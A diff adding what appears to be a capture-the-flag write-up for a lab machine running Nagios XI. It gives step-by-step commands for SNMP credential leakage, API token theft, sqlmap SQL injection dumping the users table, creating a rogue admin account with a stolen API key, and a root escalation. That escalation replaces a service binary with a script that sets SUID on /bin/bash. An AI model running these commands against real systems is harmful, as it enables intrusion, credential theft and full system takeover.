@@ -1,0 +1,92 @@
+Normal nmap scanning is TCP scanning, but some ports are opened in UDP session.
+
+#sudo nmap -sU -min-rate 5000 10.10.11.248
+
+
+smbenumeration
+--------------
+#smbwalk -v2c -c public ngios.monitored.htb
+iso.3.6.1.2.1.25.4.2.1.5.1409 = STRING: "-c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB"
+
+We got username svc and password XjH7VCehowpR1xZB.
+
+I can't use those credentials in ssh, so I make directory search in api/v1.
+
+
+
+In >> https://nagios.monitored.htb/nagiosxi/api/v1/authenticate,it says
+
+error	"You can only use POST with authenticate"
+
+We make post request with credentials
+--------------------------------------
+curl -X POST https://nagios.monitored.htb/nagiosxi/api/v1/authenticate -k -L -d "username=svc&password="XjH7VCehowpR1xZB"
+
+
+We got authentication token
+---------------------------
+{"username":"svc","user_id":"2","auth_token":"7880d232382627ace9af54715cfa99313a928486","valid_min":5,"valid_until":"Mon, 18 Mar 2024 05:37:22 -0400"}
+valid_min is 5 minute, so after that 5 minute that token cannot be used.
+
+
+https://github.com/advisories/GHSA-67j9-xc8r-7vqm
+
+
+SQL injection vul is in that url 
+--------------------------------
+In >> https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3, it displays
+Your session has timed out.
+
+So, we have to make sqlmap with authentication token.
+-----------------------------------------------------
+I added level and risk flag because I kept getting ‘unable to retrieve the database names’ error
+
+sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3&token=09755b538297f4ced0910fa481333443394b460e" -p id -level=5 -risk=3
+
+
+sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3&token=09755b538297f4ced0910fa481333443394b460e" -p id -level=5 -risk=3 -D nagiosxi -T xi_users --dump
+
+
+We got admin api-key
+---------------------
+IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL
+
+
+We cannot crack the admin password so, use the admin api-key to create new admin account
+---------------------------------------------------------------------------------------------
+curl -POST -k "https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1" -d "username=secjedi&password=secjedi&name=secjedi&email=secjedi@monitored.htb&auth_level=admin"
+
+#sudo -l
+(root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh *
+
+We see that the script manages services. Let’s work with the npcd service. First we stop the service, then check the status so we can find he location of the systemd file.
+
+#sudo ./manage_services.sh stop npcd
+#sudo ./manage_services.sh status npcd
+
+
+sudo ./manage_services.sh status npcd
+● npcd.service - Nagios Process Control Daemon
+     Loaded: loaded (/etc/systemd/system/npcd.service; enabled; vendor preset: enabled)
+     Active: inactive (dead) since Mon 2024-03-18 06:48:17 EDT; 4s ago
+    Process: 761 ExecStart=/usr/local/nagios/bin/npcd -f /usr/local/nagios/etc/pnp/npcd.cfg (code=exited, status=0/SUCCESS)
+   Main PID: 761 (code=exited, status=0/SUCCESS)
+        CPU: 689ms
+
+
+ExecStart from /usr/local/nagios/bin/npcd
+
+
+Remove existing npcd file and create new one, after that adding the payload
+---------------------------------------------------------------------------
+
+#rm /usr/local/nagios/bin/npcd
+#touch /usr/local/nagios/bin/npcd
+#chmod +x /usr/local/nagios/bin/npcd
+#echo '#!/bin/bash' > /usr/local/nagios/bin/npcd
+#echo "chmod +s /bin/bash" >> /usr/local/nagios/bin/npcd
+#sudo /usr/local/nagiosxi/scripts/manage_services.sh restart npcd
+
+Final
+-----
+#/bin/bash -p
